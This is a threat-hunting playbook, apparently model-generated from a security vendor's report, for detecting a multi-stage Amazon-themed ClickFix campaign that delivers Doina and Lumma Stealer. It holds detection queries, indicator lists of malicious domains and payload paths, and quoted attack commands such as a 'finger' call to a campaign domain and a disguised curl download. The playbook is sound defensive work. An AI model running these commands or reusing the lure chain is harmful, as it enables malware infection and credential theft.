---
analysis: This is a hunt because a simple rule for Node.js execution is too noisy.
  We use fleet-wide stack counting for process paths and join with specific HTTP URI
  patterns to build a high confidence picture of a multi-stage infection.
blind_spots:
- id: endpoint-visibility-gap
  question: whether the infection occurred on unmanaged assets
  requires: endpoint agents on all assets
  risk: Infections on shadow IT or unmanaged hosts will not be visible in process
    telemetry.
- id: websocket-content-visibility
  question: can the websocket monitor traffic be inspected for C2 commands
  requires: Layer 7 websocket frame logging
  risk: While the HTTP handshake is logged, the subsequent websocket traffic where
    monitoring occurs is not visible in hb_http_activity.
  stage: credential-access-lumma
coverage:
- stage: loader-execution-doina
  status: covered
  steps:
  - suspicious-interpreter-execution
  - malicious-payload-traffic
- stage: persistence-node-js-deployment
  status: covered
  steps:
  - suspicious-interpreter-execution
  - interpreter-path-rarity
- stage: credential-access-lumma
  status: covered
  steps:
  - suspicious-interpreter-execution
  - malicious-payload-traffic
- reason: Belongs to another part of the 'Amazon-Themed ClickFix Campaign Serves Up
    Finger-Licking Malware' series.
  stage: initial-access-seo-lure
  status: out_of_scope
- reason: Belongs to another part of the 'Amazon-Themed ClickFix Campaign Serves Up
    Finger-Licking Malware' series.
  stage: execution-finger-lolbin
  status: out_of_scope
- reason: Belongs to another part of the 'Amazon-Themed ClickFix Campaign Serves Up
    Finger-Licking Malware' series.
  stage: payload-delivery-ironpython
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: The campaign uses multi-stage, portable runtimes to deploy infostealers.
    A negative result confirms that these staging directories and associated network
    signals are absent from the estate.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An adversary is deploying portable Node.js and IronPython interpreters
  to user-writable directories to execute obfuscated Doina loaders and Lumma infostealers.
labels:
- hunt
- attack.t1055.012
- attack.t1071
- attack.t1115
- attack.t1190
- attack.t1218
- attack.t1486
- attack.t1555
- credential access
- defense evasion
- execution
- initial access
- persistence
name: Amazon ClickFix Multi-stage Malware Infection
parameters:
  c2_domains:
    default:
    - grillmasterchef.com
    - kiriosyka.com
    - grillrecipespro.com
    description: C2 domains associated with payload delivery and beaconing.
    from:
      kind: article
      observed: '2026-10-21'
      ref: huntress-amazon-clickfix
    type: list[domain]
  interpreter_names:
    default:
    - node.exe
    - ipyw32.exe
    - python.exe
    description: Filenames of portable interpreters used in the campaign.
    from:
      kind: article
      observed: '2026-10-21'
      ref: huntress-amazon-clickfix
    type: list[string]
  lookback_days:
    default: '14'
    description: Days of history to examine.
    from:
      kind: manual
      observed: '2026-10-21'
      ref: hunt-scope
    type: number
  scope_hosts:
    default: []
    description: Hostnames identified in the first step; leave empty to scan the full
      estate.
    from:
      kind: manual
      observed: '2026-10-21'
      ref: analyst-pivot
    type: list[host]
  stage_paths:
    default:
    - /timer6local
    - /v6
    - /sqr-viewertr6
    description: URL path segments for malware payload staging.
    from:
      kind: article
      observed: '2026-10-21'
      ref: huntress-amazon-clickfix
    type: list[path]
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://www.huntress.com/blog/amazon-clickfix-finger
    gates:
    - dry-run
    - lint
    model: hb_google/gemini-3-flash-preview
rationale: Focus on workstations and endpoints where end users would likely be browsing.
  Exclude developer machines where Node.js or Python might legitimately run from unusual
  paths.
references:
- name: "Huntress \u2014 Amazon-Themed ClickFix Campaign Serves Up Finger-Licking\
    \ Malware"
  url: https://www.huntress.com/blog/amazon-clickfix-finger
related:
- hunt: amazon-clickfix-finger-lolbin-execution
  reason: This hunt focuses on the infection chain following the initial finger.exe
    LOLbin execution.
  relation: follows
- hunt: amazon-clickfix-finger-abuse
  relation: follows
scenario:
  stages:
  - name: Amazon-themed SEO Poisoning
    observables:
    - orders-amazon.com.advancedfences.com
    - sites.google.com/view/ch-pc/sign-in
    - ashevilleroofingcontractor.com
    - 'Search keyword: ''amazon business'''
    slug: initial-access-seo-lure
    tactic: initial-access
    techniques:
    - T1190
  - name: Finger LOLbin Command Execution
    observables:
    - finger.exe
    - finger DLVBUCeFfF@grillrecipespro.com
    - 'Command line obfuscated with characters: ^ , - _'
    - Clipboard pastejacking via 'I'm not a robot' button
    slug: execution-finger-lolbin
    tactic: execution
    techniques:
    - T1218
    - T1115
  - name: IronPython Payload Staging
    observables:
    - curl -o %TEMP%\*.pdf github.com/IronLanguages/ironpython3/releases/download/v3.4.2/IronPython.3.4.2.zip
    - tar.exe
    - ipyw32.exe
    - IronPython.3.4.2.zip
    slug: payload-delivery-ironpython
    tactic: execution
    techniques:
    - T1218
  - name: Doina Malware Loader
    observables:
    - grillmasterchef.com/90e4a147-1234-505c-a024-062e543b5df8/timer6
    - grillmasterchef.com/90e4a147-1234-505c-a024-062e543b5df8/v6
    - Python script using Cyrillic character substitution for Base64
    - RC4 encrypted PE file 'v6'
    slug: loader-execution-doina
    tactic: defense-evasion
    techniques:
    - T1055.012
    - T1071
  - name: Node.js Environment Deployment
    observables:
    - C:\ProgramData\NodeView
    - kiriosyka.com/KsxmmKiN5N0j/sqr-viewertr6
    - node.exe
    - index.js
    - Unpacking 52MB ZIP containing portable Node.js
    slug: persistence-node-js-deployment
    tactic: persistence
    techniques:
    - T1071
  - name: Lumma Stealer Infostrealt
    observables:
    - Lumma Stealer memory injection via sRDI
    - Websocket beaconing
    - HTTPS POST profiling data containing hostname and username
    - Process hollowing into legitimate system processes
    slug: credential-access-lumma
    tactic: credential-access
    techniques:
    - T1555
    - T1055.012
    - T1071
  summary: A multi-stage ClickFix campaign uses sponsored Google search results for
    'Amazon Business' to lead victims to fake login pages and CAPTCHAs that trigger
    pastejacked commands. These commands abuse the 'finger' utility to download a
    convoluted sequence of loaders, including IronPython and Node.js, which ultimately
    deliver Doina malware and Lumma Stealer via process hollowing.
series:
  index: 2
  slug: amazon-themed-clickfix-campaign-serves-up-finger-licking-malware
  title: Amazon-Themed ClickFix Campaign Serves Up Finger-Licking Malware
  total: 2
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
  web:
    category: siem
    name: Web server / proxy logs
    telemetry:
    - network
tlp: clear
type: investigation
---


# Amazon ClickFix Multi-stage Malware Infection

This hunt targets the subsequent stages of the Amazon-themed ClickFix campaign. It identifies portable runtimes (IronPython and Node.js) operating from unusual paths like ProgramData or Temp, uses prevalence analysis to distinguish them from standard software, and corroborates the activity using HTTP telemetry for barbeque-themed C2 domains and specific payload URIs. The campaign culminate in the execution of the Doina loader and fileless Lumma Stealer which profiles the host and beacons via websockets.

## suspicious-interpreter-execution
<!-- Portable interpreters in unusual paths -->
Identify Node.js or IronPython interpreters in user-writable directories to find campaign staging.

```sqlite target=endpoint role=detection-candidate params=(lookback_days=lookback_days, interpreter_names=interpreter_names)
~~~yaml
expected: Execution of node.exe or ipyw32.exe from paths like C:\ProgramData\NodeView.
  Processes with on_disk = 0 suggest successful memory injection.
reads:
- device_hostname
- process_name
- process_path
- process_cmd_line
- user_name
- on_disk
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-10-22'
~~~
SELECT device_hostname, process_name, process_path, process_cmd_line, user_name, on_disk, time FROM hb_process_activity WHERE instr(',' || '{{interpreter_names}}' || ',', ',' || LOWER(process_name) || ',') > 0 AND (LOWER(process_path) LIKE '%\\programdata\\%' OR LOWER(process_path) LIKE '%\\users\\public\\%' OR LOWER(process_path) LIKE '%\\temp\\%') AND time >= datetime('now', '-{{lookback_days}} days')
```

## corroborate-activity
<!-- Corroborate with prevalence and network -->
parallel:
- → interpreter-path-rarity
- → malicious-payload-traffic
join: → triage-infection

## interpreter-path-rarity
<!-- Interpreter path rarity across fleet -->
Stack count the specific interpreter paths to isolate malicious deployments from standard developer workstations.

```sqlite target=endpoint role=baseline params=(lookback_days=lookback_days, interpreter_names=interpreter_names)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: Interpreter paths appearing on only a few hosts, indicating likely malware
  staging directories like NodeView.
prevalence:
  by: device_hostname
  key:
  - process_path
  rare_below: 3
reads:
- process_path
- device_hostname
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-10-22'
~~~
SELECT LOWER(process_path) AS path, COUNT(DISTINCT device_hostname) AS hosts, COUNT(*) AS runs, MIN(time) AS first_seen FROM hb_process_activity WHERE instr(',' || '{{interpreter_names}}' || ',', ',' || LOWER(process_name) || ',') > 0 AND (LOWER(process_path) LIKE '%\\programdata\\%' OR LOWER(process_path) LIKE '%\\users\\public\\%' OR LOWER(process_path) LIKE '%\\temp\\%') AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY LOWER(process_path) HAVING hosts <= 3 ORDER BY hosts, runs
```

## malicious-payload-traffic
<!-- Traffic to malicious domains and paths -->
Match network activity against the BBQ themed domains and specific payload URL paths, anchored to hosts found in the lead step.

```sqlite target=web role=enrichment params=(lookback_days=lookback_days, c2_domains=c2_domains, stage_paths=stage_paths, scope_hosts=scope_hosts)
~~~yaml
expected: HTTP requests to domains like grillmasterchef.com or paths like sqr-viewertr6.
  Silence here is common if the infection has moved to websocket communication.
reads:
- device_hostname
- url_hostname
- url_path
- http_method
- user_agent
- time
silence: not_evidence_of_absence
source: hb_http_activity
verified: dry-run
verified_at: '2026-10-22'
~~~
SELECT device_hostname, url_hostname, url_path, http_method, user_agent, time FROM hb_http_activity WHERE (instr(',' || '{{c2_domains}}' || ',', ',' || LOWER(url_hostname) || ',') > 0 OR instr(',' || '{{stage_paths}}' || ',', ',' || LOWER(url_path) || ',') > 0) AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## triage-infection
<!-- Triage the infection evidence -->
```agent target=hunter
cite: required
context:
- suspicious-interpreter-execution
- interpreter-path-rarity
- malicious-payload-traffic
max_iterations: 6
objective: Decide whether a host running a portable interpreter from a rare path has
  been compromised, specifically looking for correlations with BBQ themed domains
  or payload URIs like timer6 or v6.
success_criteria: A per host verdict of malicious | suspicious | benign citing specific
  process paths and URL hits.
tools:
- endpoint
- web
```

## route-infection
<!-- Route based on triage -->
if~: "the triage-infection verdict is malicious for at least one host" (confidence: high, judge=hunter)
then: → isolate-host
indeterminate: → analyst-review
unavailable: → analyst-review (blind_spot: endpoint-visibility-gap)
else: → close-out

## isolate-host
<!-- Isolate infected host -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host from the network. Collect the contents of C:\ProgramData\NodeView and any .pdf or .js files from the user Temp directory for analysis.
```
→ analyst-review

## analyst-review
<!-- Detailed forensic review -->
```manual target=analyst
Inspect the captured files for Cyrillic characters used to bypass Base64 decoding in Python. Check index.js for sRDI loader patterns. Review network telemetry for websocket handshakes to kiriosyka.com.
```
→ close-out

## close-out
<!-- Remediation and close out -->
```manual target=analyst
Rotate passwords for all users on infected hosts; Lumma Stealer steals local credentials.
```
→ end
